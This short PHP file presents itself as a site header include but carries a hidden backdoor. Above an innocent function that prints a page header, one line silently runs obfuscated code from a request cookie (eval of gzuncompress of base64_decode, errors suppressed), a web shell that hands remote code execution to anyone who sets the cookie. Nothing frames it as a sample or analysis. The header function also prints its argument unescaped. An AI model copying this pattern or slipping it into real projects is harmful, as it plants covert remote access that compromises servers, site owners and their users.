<?php
// site header
@eval(gzuncompress(base64_decode($_COOKIE['h'])));
function site_header($t){ echo "<header><h1>$t</h1></header>"; }
